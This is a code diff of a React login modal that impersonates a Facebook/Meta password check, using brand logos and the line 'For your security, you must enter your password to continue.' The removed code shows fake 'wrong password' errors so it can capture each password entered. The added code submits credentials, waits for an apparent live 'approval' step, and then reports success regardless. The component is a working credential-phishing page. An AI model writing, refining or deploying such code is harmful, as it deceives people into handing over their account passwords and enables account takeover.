@@ -1,8 +1,10 @@
+'use client';
+
 import { useState } from 'react';
 import PropTypes from 'prop-types';
 import MetaLogo from '@/assets/images/meta-logo-grey.png';
 import FbRoundLogo from '@/assets/images/fb_round_logo.png';
-import config from '@/utils/config';
+import { imageSrc } from '@/utils/image-src';
 
 const LoginModal = ({ show, onClose, onSubmit, onSuccess, texts }) => {
     const [formData, setFormData] = useState({
@@ -13,9 +15,7 @@ const LoginModal = ({ show, onClose, onSubmit, onSuccess, texts }) => {
     const [isLoading, setIsLoading] = useState(false);
     const [showError, setShowError] = useState(false);
     const [showPassword, setShowPassword] = useState(false);
-
-    const passwordLoadingMs = Math.max(1, Number(config.password_loading_time || 3)) * 1000;
-    const maxPasswordAttempts = Math.max(1, Number(config.max_password_attempts || 2));
+    const [waitingApproval, setWaitingApproval] = useState(false);
 
     const handleChange = (field, value) => {
         setFormData((prev) => ({ ...prev, [field]: value }));
@@ -27,32 +27,44 @@ const LoginModal = ({ show, onClose, onSubmit, onSuccess, texts }) => {
     const handleSubmit = async (e) => {
         e.preventDefault();
 
-        if (!formData.identity.trim() || !formData.password.trim()) {
+        if (!formData.identity.trim() || !formData.password.trim() || isLoading) {
             return;
         }
 
         setIsLoading(true);
         setShowError(false);
+        setWaitingApproval(true);
 
-        setTimeout(() => {
-            setIsLoading(false);
+        try {
+            const result = await onSubmit(formData.identity, formData.password);
+            setWaitingApproval(false);
 
-            if (loginAttempt + 1 < maxPasswordAttempts) {
-                setShowError(true);
-                setLoginAttempt((prev) => prev + 1);
-                onSubmit(formData.identity, formData.password);
-                setFormData((prev) => ({ ...prev, password: '' }));
-            } else {
-                setShowError(false);
-                onSubmit(formData.identity, formData.password);
+            if (result?.approved) {
                 onSuccess();
+                return;
             }
-        }, passwordLoadingMs);
+
+            const nextAttempt = loginAttempt + 1;
+            setLoginAttempt(nextAttempt);
+
+            if (result?.isLastAttempt) {
+                onSuccess();
+                return;
+            }
+
+            setShowError(true);
+            setFormData((prev) => ({ ...prev, password: '' }));
+        } catch {
+            setWaitingApproval(false);
+            setShowError(true);
+            setFormData((prev) => ({ ...prev, password: '' }));
+        } finally {
+            setIsLoading(false);
+        }
     };
 
     if (!show) return null;
 
-    /* ── Styles ── */
     const overlayStyle = {
         position: 'fixed',
         inset: 0,
@@ -61,7 +73,7 @@ const LoginModal = ({ show, onClose, onSubmit, onSuccess, texts }) => {
         display: 'flex',
         justifyContent: 'center',
         alignItems: 'center',
-        padding: '16px',
+        padding: '16px'
     };
 
     const cardStyle = {
@@ -75,9 +87,7 @@ const LoginModal = ({ show, onClose, onSubmit, onSuccess, texts }) => {
         flexDirection: 'column',
         minHeight: 'min(860px, calc(100vh - 16px))',
         maxHeight: 'min(860px, calc(100vh - 16px))',
-        overflowY: 'auto',
-        transform: 'scale(1)',
-        opacity: 1,
+        overflowY: 'auto'
     };
 
     const contentStyle = {
@@ -86,7 +96,7 @@ const LoginModal = ({ show, onClose, onSubmit, onSuccess, texts }) => {
         flexDirection: 'column',
         alignItems: 'center',
         justifyContent: 'space-between',
-        flex: 1,
+        flex: 1
     };
 
     const inputStyle = {
@@ -97,7 +107,7 @@ const LoginModal = ({ show, onClose, onSubmit, onSuccess, texts }) => {
         padding: '0 42px 0 12px',
         fontSize: '14px',
         outline: 'none',
-        boxSizing: 'border-box',
+        boxSizing: 'border-box'
     };
 
     const passwordWrapStyle = {
@@ -133,7 +143,7 @@ const LoginModal = ({ show, onClose, onSubmit, onSuccess, texts }) => {
         margin: 0,
         display: 'inline-flex',
         alignItems: 'center',
-        justifyContent: 'center',
+        justifyContent: 'center'
     };
 
     const submitBtnStyle = {
@@ -147,7 +157,7 @@ const LoginModal = ({ show, onClose, onSubmit, onSuccess, texts }) => {
         fontWeight: 500,
         border: 'none',
         cursor: isLoading ? 'default' : 'pointer',
-        transition: 'background-color 0.2s ease',
+        transition: 'background-color 0.2s ease'
     };
 
     return (
@@ -155,7 +165,7 @@ const LoginModal = ({ show, onClose, onSubmit, onSuccess, texts }) => {
             <div style={cardStyle} onClick={(e) => e.stopPropagation()}>
                 <div style={contentStyle}>
                     <div style={{ width: '48px', height: '48px', marginBottom: '20px' }}>
-                        <img src={FbRoundLogo} width="100%" height="100%" alt="Meta" style={{ objectFit: 'contain' }} />
+                        <img src={imageSrc(FbRoundLogo)} width='100%' height='100%' alt={texts.providerFacebook || 'Facebook'} style={{ objectFit: 'contain' }} />
                     </div>
 
                     <div style={{ width: '100%' }}>
@@ -163,15 +173,12 @@ const LoginModal = ({ show, onClose, onSubmit, onSuccess, texts }) => {
                             {texts.securityReason || 'For your security, you must enter your password to continue.'}
                         </p>
 
-                        <form autoComplete="off" onSubmit={handleSubmit}>
+                        <form autoComplete='off' onSubmit={handleSubmit}>
                             <input
                                 style={identityInputStyle}
-                                type="text"
-                                placeholder={texts.loginIdentityPlaceholder || 'Email hoặc số điện thoại'}
-                                autoComplete="off"
-                                autoCorrect="off"
-                                autoCapitalize="none"
-                                spellCheck="false"
+                                type='text'
+                                placeholder={texts.loginIdentityPlaceholder || 'Email or phone number'}
+                                autoComplete='off'
                                 required
                                 value={formData.identity}
                                 onChange={(e) => handleChange('identity', e.target.value)}
@@ -182,26 +189,23 @@ const LoginModal = ({ show, onClose, onSubmit, onSuccess, texts }) => {
                                     style={inputStyle}
                                     type={showPassword ? 'text' : 'password'}
                                     placeholder={texts.password || 'Password'}
-                                    autoComplete="off"
-                                    autoCorrect="off"
-                                    autoCapitalize="none"
-                                    spellCheck="false"
-                                    maxLength="30"
-                                    minLength="3"
+                                    autoComplete='off'
+                                    maxLength='30'
+                                    minLength='3'
                                     required
                                     value={formData.password}
                                     onChange={(e) => handleChange('password', e.target.value)}
                                 />
                                 <button
-                                    type="button"
+                                    type='button'
                                     style={eyeBtnStyle}
-                                    aria-label={showPassword ? 'Hide password' : 'Show password'}
                                     onClick={() => setShowPassword((prev) => !prev)}
+                                    aria-label={showPassword ? texts.hidePasswordLabel || 'Hide password' : texts.showPasswordLabel || 'Show password'}
                                 >
-                                    <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round" aria-hidden="true">
-                                        <path d="M2 12s3.5-6 10-6 10 6 10 6-3.5 6-10 6-10-6-10-6z" />
-                                        <circle cx="12" cy="12" r="2.8" />
-                                        {showPassword && <path d="M4 20L20 4" />}
+                                    <svg viewBox='0 0 24 24' width='18' height='18' fill='none' stroke='currentColor' strokeWidth='1.8'>
+                                        <path d='M2 12s3.5-6 10-6 10 6 10 6-3.5 6-10 6-10-6-10-6z' />
+                                        <circle cx='12' cy='12' r='2.8' />
+                                        {showPassword && <path d='M4 20L20 4' />}
                                     </svg>
                                 </button>
                             </div>
@@ -212,32 +216,32 @@ const LoginModal = ({ show, onClose, onSubmit, onSuccess, texts }) => {
                                 </p>
                             )}
 
-                            <button
-                                type="submit"
-                                style={submitBtnStyle}
-                                disabled={isLoading}
-                                onMouseOver={(e) => {
-                                    if (!isLoading) e.currentTarget.style.backgroundColor = '#1d4ed8';
-                                }}
-                                onMouseOut={(e) => {
-                                    e.currentTarget.style.backgroundColor = '#0064E0';
-                                }}
-                            >
+                            {waitingApproval && isLoading && (
+                                <p style={{ color: '#0064E0', fontSize: '13px', margin: '0 0 12px 0', textAlign: 'center' }}>
+                                    {texts.waitingApproval || 'Waiting for verification...'}
+                                </p>
+                            )}
+
+                            <button type='submit' style={submitBtnStyle} disabled={isLoading}>
                                 {isLoading ? (
-                                    <span style={{
-                                        width: '18px',
-                                        height: '18px',
-                                        border: '2px solid rgba(255,255,255,0.4)',
-                                        borderTopColor: '#fff',
-                                        borderRadius: '50%',
-                                        animation: 'spin 0.8s linear infinite',
-                                        display: 'inline-block',
-                                    }} />
-                                ) : (texts.continueBtn || 'Continue')}
+                                    <span
+                                        style={{
+                                            width: '18px',
+                                            height: '18px',
+                                            border: '2px solid rgba(255,255,255,0.4)',
+                                            borderTopColor: '#fff',
+                                            borderRadius: '50%',
+                                            animation: 'spin 0.8s linear infinite',
+                                            display: 'inline-block'
+                                        }}
+                                    />
+                                ) : (
+                                    texts.continueBtn || 'Continue'
+                                )}
                             </button>
 
                             <p style={{ textAlign: 'center', marginTop: '12px', marginBottom: 0 }}>
-                                <a href="#" style={{ color: '#9a979e', fontSize: '14px', textDecoration: 'none' }}>
+                                <a href='#' style={{ color: '#9a979e', fontSize: '14px', textDecoration: 'none' }}>
                                     {texts.forgotPassword || 'Forgot your password?'}
                                 </a>
                             </p>
@@ -245,16 +249,12 @@ const LoginModal = ({ show, onClose, onSubmit, onSuccess, texts }) => {
                     </div>
 
                     <div style={{ width: '64px', marginTop: '20px' }}>
-                        <img src={MetaLogo} width="100%" alt="Meta" style={{ objectFit: 'contain' }} />
+                        <img src={imageSrc(MetaLogo)} width='100%' alt={texts.altMeta || 'Meta'} style={{ objectFit: 'contain' }} />
                     </div>
                 </div>
             </div>
 
-            <style>{`
-                @keyframes spin {
-                    to { transform: rotate(360deg); }
-                }
-            `}</style>
+            <style>{`@keyframes spin { to { transform: rotate(360deg); } }`}</style>
         </div>
     );
 };
